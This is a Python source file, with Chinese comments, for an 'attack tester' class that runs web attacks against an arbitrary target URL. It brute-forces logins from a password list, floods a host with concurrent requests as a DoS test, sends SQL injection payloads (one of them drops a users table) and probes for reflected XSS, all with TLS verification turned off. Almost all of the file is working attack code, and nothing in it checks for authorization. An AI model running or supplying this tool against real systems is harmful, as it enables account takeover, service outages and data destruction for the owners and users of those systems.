"""
攻击测试工具
"""
import asyncio
import httpx
from typing import Dict, List, Optional, Callable
from datetime import datetime
from utils.logger import logger


class AttackTester:
    """攻击测试工具：执行常见的网络攻击测试"""
    
    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.attack_history: List[Dict] = []
    
    async def brute_force_login(
        self,
        target_url: str,
        username: str,
        password_list: List[str],
        login_endpoint: str = "/login",
        method: str = "POST"
    ) -> Optional[Dict]:
        """暴力破解登录"""
        logger.warning(f"开始暴力破解测试: {target_url}{login_endpoint}")
        
        success_credentials = None
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                for password in password_list:
                    try:
                        if method.upper() == "POST":
                            response = await client.post(
                                f"{target_url}{login_endpoint}",
                                data={"username": username, "password": password},
                                follow_redirects=False
                            )
                        else:
                            response = await client.get(
                                f"{target_url}{login_endpoint}",
                                params={"username": username, "password": password},
                                follow_redirects=False
                            )
                        
                        # 检查是否登录成功（根据响应状态码或内容判断）
                        if response.status_code in [200, 302, 301]:
                            # 检查响应中是否包含登录成功的标识
                            if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                                success_credentials = {
                                    "username": username,
                                    "password": password,
                                    "status_code": response.status_code
                                }
                                logger.warning(f"发现有效凭据: {username}:{password}")
                                break
                    except Exception as e:
                        logger.debug(f"尝试密码 {password} 时出错: {e}")
                        continue
        except Exception as e:
            logger.error(f"暴力破解测试失败: {e}")
        
        result = {
            "attack_type": "Brute Force Login",
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "success": success_credentials is not None,
            "credentials": success_credentials
        }
        
        self.attack_history.append(result)
        return result
    
    async def dos_test(
        self,
        target_url: str,
        duration: int = 10,
        concurrent_requests: int = 100
    ) -> Dict:
        """DoS测试（压力测试）"""
        logger.warning(f"开始DoS测试: {target_url}, 持续时间: {duration}秒")
        
        start_time = datetime.now()
        request_count = 0
        success_count = 0
        error_count = 0
        
        async def make_request():
            nonlocal request_count, success_count, error_count
            try:
                async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                    response = await client.get(target_url)
                    request_count += 1
                    if response.status_code == 200:
                        success_count += 1
                    else:
                        error_count += 1
            except Exception as e:
                request_count += 1
                error_count += 1
        
        end_time = start_time.timestamp() + duration
        
        while datetime.now().timestamp() < end_time:
            tasks = [make_request() for _ in range(concurrent_requests)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)  # 短暂延迟避免过度占用资源
        
        result = {
            "attack_type": "DoS Test",
            "target": target_url,
            "duration": duration,
            "timestamp": datetime.now().isoformat(),
            "total_requests": request_count,
            "successful_requests": success_count,
            "failed_requests": error_count,
            "requests_per_second": request_count / duration if duration > 0 else 0
        }
        
        self.attack_history.append(result)
        return result
    
    async def sql_injection_attack(
        self,
        target_url: str,
        parameter: str
    ) -> Dict:
        """SQL注入攻击测试"""
        logger.warning(f"开始SQL注入测试: {target_url}, 参数: {parameter}")
        
        payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1--",
            "1'; DROP TABLE users--"
        ]
        
        successful_payloads = []
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                for payload in payloads:
                    try:
                        response = await client.get(
                            target_url,
                            params={parameter: payload},
                            follow_redirects=True
                        )
                        
                        # 检查SQL错误信息
                        error_keywords = [
                            "sql syntax", "mysql", "postgresql",
                            "database error", "sql error"
                        ]
                        
                        content_lower = response.text.lower()
                        for keyword in error_keywords:
                            if keyword in content_lower:
                                successful_payloads.append({
                                    "payload": payload,
                                    "evidence": keyword,
                                    "status_code": response.status_code
                                })
                                break
                    except:
                        continue
        except Exception as e:
            logger.error(f"SQL注入测试失败: {e}")
        
        result = {
            "attack_type": "SQL Injection",
            "target": target_url,
            "parameter": parameter,
            "timestamp": datetime.now().isoformat(),
            "successful": len(successful_payloads) > 0,
            "payloads": successful_payloads
        }
        
        self.attack_history.append(result)
        return result
    
    async def xss_attack(
        self,
        target_url: str,
        parameter: str
    ) -> Dict:
        """XSS攻击测试"""
        logger.warning(f"开始XSS测试: {target_url}, 参数: {parameter}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        successful_payloads = []
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                for payload in payloads:
                    try:
                        response = await client.get(
                            target_url,
                            params={parameter: payload},
                            follow_redirects=True
                        )
                        
                        # 检查payload是否在响应中未转义
                        if payload in response.text:
                            successful_payloads.append({
                                "payload": payload,
                                "status_code": response.status_code
                            })
                    except:
                        continue
        except Exception as e:
            logger.error(f"XSS测试失败: {e}")
        
        result = {
            "attack_type": "XSS",
            "target": target_url,
            "parameter": parameter,
            "timestamp": datetime.now().isoformat(),
            "successful": len(successful_payloads) > 0,
            "payloads": successful_payloads
        }
        
        self.attack_history.append(result)
        return result
    
    def get_attack_history(self) -> List[Dict]:
        """获取攻击历史"""
        return self.attack_history
    
    def clear_history(self):
        """清空攻击历史"""
        self.attack_history.clear()

